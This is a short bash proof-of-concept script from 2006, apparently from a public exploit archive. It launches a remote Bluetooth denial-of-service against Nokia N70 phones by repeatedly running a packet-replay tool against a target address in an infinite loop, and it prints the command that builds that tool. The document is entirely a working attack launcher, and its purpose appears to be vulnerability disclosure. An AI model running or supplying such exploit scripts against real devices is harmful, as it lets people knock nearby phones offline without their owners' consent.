#!/bin/bash
# Another Nokia N70 Bluetooth remote Denial of Service
# Pierre BETOUIN pierre.betouin@infratech.fr
# Feb 14 11:21:58 GMT+1 2006

echo "Another Nokia N70 Bluetooth remote Denial of Service"
echo "Pierre BETOUIN pierre.betouin@infratech.fr"
echo ""
if (( $# < 1 )); then
echo "Usage: $0 <btdaddr> (uses replay_l2cap_packet_nokiaN70)"
exit
fi

if [ -x ./replay_l2cap_packet_nokiaN70 ]; then
echo "Kill this prog with \"killall -9 loop.sh\" in another terminal."
echo "PRESS ENTER TO LAUNCH THE DoS (or Ctrl-c to exit now)"
echo ""
read
while (( 1 )); do # Infinite loop, a bit dirty, we must say ;)
./replay_l2cap_packet_nokiaN70 $1
done
else
echo "You must compile replay_l2cap_packet_nokiaN70 before"
echo "gcc -lbluetooth -o replay_l2cap_packet_nokiaN70 replay_l2cap_packet_nokiaN70.c"
exit

fi 
